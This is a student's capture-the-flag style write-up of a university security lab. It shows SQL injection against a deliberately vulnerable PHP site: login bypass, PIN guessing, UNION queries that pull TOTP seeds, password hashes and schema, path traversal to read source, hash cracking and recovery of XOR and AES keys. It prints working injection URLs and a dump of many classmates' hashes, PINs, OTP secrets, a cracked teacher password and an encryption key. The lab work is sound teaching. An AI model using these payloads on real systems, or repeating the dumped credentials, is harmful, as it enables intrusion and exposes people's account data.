# SQL Injection Writeup

## Task 1: Login without password

Firstly, we check injection vulnerability by putting special characters as input:

username: .,*!';-°`"'#
password: foo

this gives us to error page:

"""
Wrong SQL query: SELECT username FROM users WHERE username = '.,*!';-°`"'#' AND password
"""

So we know there is sql injection vulnerability in username field. So in the future I will be always putting injection only to username field and random placerholder into password. After some playing we found out that hashtag character is used as comment in backend sql engine. So by putting

"""
username: repamart'; #
"""

we pass first step.

## Task 2: Find out your PIN

To find our pin we logout and by following sql injection we iterate through digit by digit:

"""
username: repamart' and pin like "0%" #
"""

My pin is *7135*

## Task 3: Overcome One-Time-Password

We do not know column name of desired value to pass OTP step. Also, we don't know length and used alphabet so previous method would take a lot of time. Again, after some time of try and error to find out correct column name I ended up with following injection to extract OTP:

"""
nonsense' UNION SELECT secret FROM users WHERE username = 'repamart';#
"""

Column name is *secret* and my value: *6VG4QMSVKJFJ7TC2*

Extracted value does not directly work as the OTP. After some Googling I realise there might be TOTP used instead and we have extracted seed for generation in given timestamp. Python helps us to get final OTP:

"""
>>> import pyotp; pyotp.TOTP('6VG4QMSVKJFJ7TC2').now()
""" 

We are in.

## Task 4: Exfiltrate a list of all usernames, passwords, salts, secrets and pins

I explore the website. I immediately see path traversal so I look at php source code via this url `https://kbe.felk.cvut.cz/index.php?open=index.php`. I read backend source code and I see another vulnerable sql query inside url argument *offset*. I crafted following injection:

"""
https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT CONCAT(username, "-", password, "-", pin, "-", secret, "-", salt), 1 FROM users
"""

Second returned column is used in some xor encryption so I have to use only the first one. CONCAT does the job and separates final values using dash character. Later, I parsed the output in Python and these are the exfiltrated data. 

"""yaml
- username: komartom
  password: 2d55131b6752f066ee2cc57ba8bf781b4376be85
  pin: 7821
  secret: OQEBJKRVXKJIWBOC
  salt: kckct
- username: charvj10
  password: 284709bfe4fbf1aefec9482f34bcf03470d078bd
  pin: 9748
  secret: HT5MIVD2KADVOGXC
  salt: 4f093
- username: drimajak
  password: 1fea7f1395fe92eb4cf70f261c54a32a49e94914
  pin: 8693
  secret: OPWNDPUVYDD2NZ5Z
  salt: c6880
- username: forstluk
  password: c95cbbc323b039cbb8594f1e406163a8d8f05fc7
  pin: 8352
  secret: F4SZTF6JCSZIUJAS
  salt: b643c
- username: halasluk
  password: 4484b673dec9e7dcb54f40f752a0bdc830cc294f
  pin: 9380
  secret: VC63ZKWNJSNBJ36C
  salt: 5a1b8
- username: hereldav
  password: b6a69d59dd2313f6d1237f9e34ef68e466a1cdbe
  pin: 3541
  secret: UYQ3HCP7Q67OIONB
  salt: a0c58
- username: hlusijak
  password: 7010fd5fadaef60371cc8a65493aa5c4ac3be6c0
  pin: 3142
  secret: 6SJJJGVQ5ZMVX77K
  salt: 2e362
- username: hruskan1
  password: 4a90c2db5ab816ca36e23bdcfa51201a2fbd7808
  pin: 1496
  secret: QO2WCOGARO2DFLYC
  salt: 7aac6
- username: kadlej24
  password: e3fbf88139050fedaa655160b97000f5a165cacf
  pin: 1962
  secret: NKHLS45QURQYUVHB
  salt: 77a32
- username: landama2
  password: 6537a630a32e92eeec54170e55eae5c11d5f7968
  pin: 7329
  secret: WJT3PREACWCFNTV3
  salt: 6a666
- username: manhaond
  password: 3a59fbb150c725c7eabba452410f2553eb3782e6
  pin: 4377
  secret: IQASWFV24KZPCL4I
  salt: c6b72
- username: mayerja1
  password: 6ce4b86f28d9edc46a73b4a29d772a5174ccd936
  pin: 3937
  secret: W5HMGFVHQZAI3IGO
  salt: 110cf
- username: michap17
  password: 202ea007933f809d4417979f03064025e2edd0d4
  pin: 1663
  secret: LH4R7QBUHF6M4WSO
  salt: 63c9a
- username: outravoj
  password: c73d9bddc004074ab86be659423fbed312da6f13
  pin: 2690
  secret: RDYZT6Q3TPUCY3OV
  salt: 2db4b
- username: purkrmir
  password: 30adf221c75c06db71155f3d1376e972b14c5b03
  pin: 4933
  secret: 627WTIRH2YR6BUZT
  salt: 30990
- username: repamart
  password: e100c06f3a9d3426de2c974448a3ab6cb8b0e247
  pin: 7135
  secret: 6VG4QMSVKJFJ7TC2
  salt: f75bf
- username: sidlovac
  password: 2e4872bde96cffd5aec7b40e1dc51080205e3062
  pin: 1601
  secret: 5UG2B4SA762B5N2R
  salt: 0c8fb
- username: sipekmi2
  password: fd1602b07769c3a774802f0ef2e25f8eee69c5c3
  pin: 7634
  secret: NHNDJXFKFDNR6NMD
  salt: f5254
- username: uhlikfil
  password: c6a63022478e2d28c0a191587ab466db2b3da9d8
  pin: 1830
  secret: IW2PKTDXXHDLMLY5
  salt: 3dad0
- username: vankejan
  password: 27686936e8285f4d5dabf72443356159a89114bc
  pin: 8011
  secret: F7ALLHF7DKD6K4VL
  salt: e2d72
- username: kucerkr1
  password: 476c77fbd5ada79d1cde60dcec29da504d66e5bc
  pin: 3610
  secret: 2FWOJFMVDECP5LCJ
  salt: cf50f
- username: nollhyne
  password: 4abbab98ec4cde7771a656468c6d562dae62ca34
  pin: 5792
  secret: 7GEVGIMRGZ3Q6KRK
  salt: 57f43
"""

## Task 5: Crack your password hash

In source code of index.php we can see that used hash function was `sha1`. Also, we know length of password, used alphabet and salt so it's easy to bruteforce the hash. For example following recursive python function cracks the password for us:

"""python
def crack():
    salt = "f75bf"
    alp = string.ascii_lowercase + string.digits
    exp = "e100c06f3a9d3426de2c974448a3ab6cb8b0e247"
    counter = 0
    def perm(cur):
        nonlocal salt, alp, exp, counter
        if len(cur) == 5:
            counter += 1
            x = (cur + salt).encode()
            h = hashlib.sha1(x).hexdigest()
            if counter % 10000 == 0:
                print(x, h)
            if h == exp:
                print(x, h, "!!!!!!!!!!!!!!")
                return True
        else:
            for c in alp:
                if perm(cur + c):
                    return True
        return False
    perm("")
"""

## Task 6: Crack teacher's password hash

From extracted data:

"""yaml
- username: komartom
  password: 2d55131b6752f066ee2cc57ba8bf781b4376be85
  salt: kckct
"""

I listen to the assignment and google some sha1 hash cracking websites. Among first results there is [this website](https://www.dcode.fr/sha1-hash) which gives us teacher's password:


`fm9fytmf7q`


## Task 7: Explain why teacher's password is insecure despite its length

There are 2 issues with teacher's password:
* It's not as random as it seems. With a bit of help from uncle Google we see that it's actually a beggining of microsoft office XP serial key, e.g. known and not random
* it's using only digits and lowercase characters

## Task 8: Print a list of all table names and their columns in `kbe` database

To extract table names (it gives us also standard sql tables but that does not matter, we can easily tell which belong to kbe application):
"""
https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT table_name, 1 FROM information_schema.tables; #
"""

To extract column names:
"""
https://kbe.felk.cvut.cz/index.php?offset=1 UNION SELECT column_name, 1 FROM information_schema.columns;#
"""

This gives us all columns in the whole database. To get just columns for specific tables, we can add a `WHERE table_name = "..."` filter.

Application tables and its columns:
"""yaml
messages: 
  - username
  - base64_message_xor_key
  - date_time
codes:
  - username
  - aes_encrypt_code
users:
  - username
  - password
  - pin
  - secret
  - salt
"""

## Task 9: Derive xor key used for encoding your messages

We see that first message looks like this:
"""html
Welcome <b>repamart</b>, this is your first secret message.
"""

We also can find in a db that xored message (and base64 encoded) looks like this:
"""
PAcJPFkOURRjGlEAOhsEFD5ARA4eCVxJf0ILXUd/ERxSJgQQC39UWUBCH0IWOlURUUB/FQoBLAoCHHE=
"""

Index.php source tells us that xor key has this format `kbe_REPLACE_xor_key_2021` and REPLACE substring is 4 characters long. 


We can just do `xored_message ^ plain_message` to get the key beacuse of following properties: 
"""
k ^ m     = c
k ^ m ^ m = c ^ m
k ^ 0     = c ^ m
k         = c ^ m 
""

This python code does the job for us and finds the REPLACE substring
"""python
>>> from base64 import b64decode
>>> msg = b"Welcome <b>repamart</b>, this is your first secret message."
>>> xored_b64 = b"PAcJPFkOURRjGlEAOhsEFD5ARA4eCVxJf0ILXUd/ERxSJgQQC39UWUBCH0IWOlURUUB/FQoBLAoCHHE="
>>> ''.join([chr(x^y) for x,y in zip(msg[4:8], b64decode(xored_b64)[4:8])])
6c44
"""

Also, another approach and verification is by generating the key as was originaly done in the php script:
"""python
>>> import hashlib
>>> hashlib.sha1(b"repamart" + b"kbe_REPLACE_xor_key_2021").hexdigest()[:4]
6c44
"""

Ergo, the key is `kbe_6c44_xor_key_2021`

## [BONUS :hurtrealbad:] Task 10: Find out key used for encoding secure codes

Defined in already discussed `php.script`

"""php
define("AES_ENCRYPT_CODE_KEY", "iHw35UKAPaSYKf8SI44CwYPa");
"""

## [BONUS :feelsgood:] Task 11: Steal Martin Rehak's secure code

We don't see Martin Rehak among exfiltrated users. After some time I found his record in `code` table. 

"""
https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT aes_encrypt_code, 1 FROM codes where username 'rehakmar'; #
"""

Ecrypted code looks like this `E3BCC1C2ACBDA02B07A04D576ED0BE9DE52286F0102DD8DC83BC839790862352`. Used key and used cipher is located in previously discovered php script. We're dealing with AES and key `iHw35UKAPaSYKf8SI44CwYPa`. My personal tries to decrypt the code failed - including Python scipt and cyberchef utility. However, we can use already running sql engine within the application for decryption like this:
"""
https://kbe.felk.cvut.cz/index.php?offset=1 UNION ALL SELECT AES_DECRYPT(UNHEX(aes_encrypt_code), "iHw35UKAPaSYKf8SI44CwYPa"), 1 FROM codes where username = "rehakmar"; #
"""

and we get teacher's code `scorpion-ask-milk-sunny`

